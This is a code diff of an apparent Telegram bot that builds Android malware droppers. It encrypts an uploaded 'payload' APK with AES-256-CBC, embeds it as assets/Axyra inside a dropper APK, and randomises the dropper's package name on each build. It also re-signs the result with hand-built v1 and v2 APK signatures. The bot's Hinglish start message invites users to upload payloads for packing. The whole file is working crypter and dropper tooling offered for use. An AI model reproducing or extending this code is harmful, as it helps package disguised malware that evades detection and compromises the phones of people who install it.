@@ -110,8 +110,8 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
 
     EOCD_SIG   = 0x06054b50
     MAGIC      = b"APK Sig Block 42"
-    ALGO_ID    = 0x0103          # RSASSA-PKCS1-v1_5 + SHA-256
-    CHUNK_SIZE = 1 << 20         # 1 MiB
+    ALGO_ID    = 0x0103
+    CHUNK_SIZE = 1 << 20
 
     n = len(apk_bytes)
     eocd_off = -1
@@ -123,12 +123,8 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
         return apk_bytes
 
     cd_offset = struct.unpack_from('<I', apk_bytes, eocd_off + 16)[0]
-
     part1 = apk_bytes[:cd_offset]
     part2 = apk_bytes[cd_offset:eocd_off]
-    # Part 3: EOCD as-is — its CD_OFFSET field already equals cd_offset,
-    # which is exactly where the signing block will be inserted, matching
-    # what Android's verifier reconstructs during verification.
     part3 = apk_bytes[eocd_off:]
 
     def _chunk_digests(data: bytes) -> list[bytes]:
@@ -148,35 +144,30 @@ def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
         b'\x5a' + struct.pack('<I', len(all_cd)) + b''.join(all_cd)
     ).digest()
 
-    cert_der    = cert.public_bytes(serialization.Encoding.DER)
-    pub_der     = key.public_key().public_bytes(
+    cert_der = cert.public_bytes(serialization.Encoding.DER)
+    pub_der  = key.public_key().public_bytes(
         serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
     )
 
-    # SignedData = digests_list || certs_list || attrs_list
-    # Each item inside a list is itself length-prefixed (getLengthPrefixedSlice in AOSP).
     digest_item_data = struct.pack('<I', ALGO_ID) + _lp(top_digest)
-    digests_list     = _lp(_lp(digest_item_data))   # outer list wraps one lp-item
-
-    certs_list = _lp(_lp(cert_der))                 # outer list wraps one lp-cert
-    attrs_list = _lp(b'')                            # empty attributes
-
-    signed_data = digests_list + certs_list + attrs_list
+    digests_list     = _lp(_lp(digest_item_data))
+    certs_list       = _lp(_lp(cert_der))
+    attrs_list       = _lp(b'')
+    signed_data      = digests_list + certs_list + attrs_list
 
     raw_sig = key.sign(signed_data, rsa_pad.PKCS1v15(), hashes.SHA256())
 
-    # Signatures list: same pattern — each entry is length-prefixed within the list
     sig_item_data   = struct.pack('<I', ALGO_ID) + _lp(raw_sig)
     signatures_list = _lp(_lp(sig_item_data))
 
     signer  = _lp(signed_data) + signatures_list + _lp(pub_der)
-    signers = _lp(_lp(signer))    # outer = sequence, inner = per-signer LP item
+    signers = _lp(_lp(signer))
 
-    pair        = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
-    block_size  = len(pair) + 8 + 16
-    sig_block   = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC
+    pair       = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
+    block_size = len(pair) + 8 + 16
+    sig_block  = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC
 
-    new_cd_off  = cd_offset + len(sig_block)
+    new_cd_off   = cd_offset + len(sig_block)
     eocd_patched = bytearray(apk_bytes[eocd_off:])
     struct.pack_into('<I', eocd_patched, 16, new_cd_off)
 
@@ -195,7 +186,6 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
     if key is None:
         return apk_bytes, False
 
-    # Read entries from existing APK (don't repack — just compute digests)
     zin = zipfile.ZipFile(io.BytesIO(apk_bytes))
     entries = []
     for item in zin.infolist():
@@ -204,10 +194,8 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
         entries.append((item.filename, zin.read(item.filename)))
     zin.close()
 
-    # MANIFEST.MF
     manifest = _build_manifest(entries)
 
-    # CERT.SF — digest of each MANIFEST.MF section
     sf_sections = []
     for name, data in entries:
         digest = _b64(hashlib.sha256(data).digest())
@@ -215,7 +203,6 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
         sf_sections.append((name, sect))
     cert_sf = _build_sf(manifest, sf_sections)
 
-    # CERT.RSA — embedded PKCS#7 (not detached; Android JAR verifier needs content inside)
     cert_rsa = (
         pkcs7.PKCS7SignatureBuilder()
         .set_data(cert_sf)
@@ -223,7 +210,6 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
         .sign(serialization.Encoding.DER, [])
     )
 
-    # APPEND META-INF to the existing APK bytes — do NOT repack entries
     out = io.BytesIO(apk_bytes)
     with zipfile.ZipFile(out, "a") as zout:
         for mname, mdata in [
@@ -238,7 +224,6 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
     apk_v1 = out.getvalue()
     log.info("APK signed (v1/JAR, appended META-INF)")
 
-    # Add APK Signature Scheme v2 block (required on Android 7.0+ for full compat)
     try:
         apk_v1v2 = _add_v2_signature(apk_v1, key, cert)
         log.info("APK v2 signing block added (%d bytes)", len(apk_v1v2) - len(apk_v1))
@@ -249,40 +234,49 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
 
 # ─── State ────────────────────────────────────────────────────────────────────
 
-# user_id → True means waiting for APK upload
 awaiting_apk: set[int] = set()
 
 # ─── Crypto ───────────────────────────────────────────────────────────────────
+
+import string as _string
+import random as _random
 
 def encrypt_payload(data: bytes) -> bytes:
     iv = secrets.token_bytes(16)
     cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(pad(data, AES.block_size))
 
-import string as _string
-import random as _random
-
 OLD_PKG = "com.gdww.ihwc.hpfv"
-_CHARS  = _string.ascii_lowercase + _string.digits   # a-z 0-9
+_CHARS  = _string.ascii_lowercase + _string.digits
 
 def _random_pkg() -> str:
-    """Generate a random same-length replacement package name."""
     suffix = ''.join(_random.choices(_CHARS, k=4))
     return f"com.gdww.ihwc.{suffix}"
 
 def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
-    """Replace OLD_PKG with new_pkg in binary AXML (UTF-16LE)."""
-    assert len(new_pkg) == len(OLD_PKG), "package name length must match"
-    old = OLD_PKG.encode('utf-16-le')
-    new = new_pkg.encode('utf-16-le')
-    result = bytearray(data)
-    pos = 0
+    """Replace standalone OLD_PKG in binary AXML (UTF-16LE).
+
+    Skips occurrences followed by '.' (0x2e 0x00) so class names like
+    com.gdww.ihwc.hpfv.MainActivity, ContentProvider authorities, and
+    intent action strings are left intact. DEX class descriptors still
+    use the original package; only the manifest 'package' attribute changes.
+    """
+    assert len(new_pkg) == len(OLD_PKG)
+    old     = OLD_PKG.encode('utf-16-le')
+    new     = new_pkg.encode('utf-16-le')
+    dot_u16 = b'\x2e\x00'   # '.' in UTF-16LE
+    result  = bytearray(data)
+    pos     = 0
     while True:
         idx = result.find(old, pos)
         if idx == -1:
             break
-        result[idx:idx + len(old)] = new
-        pos = idx + len(new)
+        after = bytes(result[idx + len(old):idx + len(old) + 2])
+        if after != dot_u16:
+            result[idx:idx + len(old)] = new
+            pos = idx + len(new)
+        else:
+            pos = idx + len(old)
     return bytes(result)
 
 def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
@@ -295,7 +289,7 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
         for item in zin.infolist():
             if item.filename.startswith("META-INF/"):
                 continue
-            data = zin.read(item)          # ZipInfo direct read — safe for mangled filenames
+            data = zin.read(item)
             if item.filename == ASSET_NAME:
                 data = encrypted
             elif item.filename == "AndroidManifest.xml":
@@ -325,7 +319,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━━\n"
         "Naya payload APK upload karo — main usse encrypt karke\n"
         "dropper ke andar Axyra replace kar dunga.\n\n"
-        "📦 *Dropper:* `com.gdww.ihwc.*` (random per build)\n"
+        "📦 *Dropper:* `com.gdww.ihwc.<random>`\n"
         "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
         "📁 *Asset:* `assets/Axyra`\n\n"
         "Neeche menu se option chuno 👇",
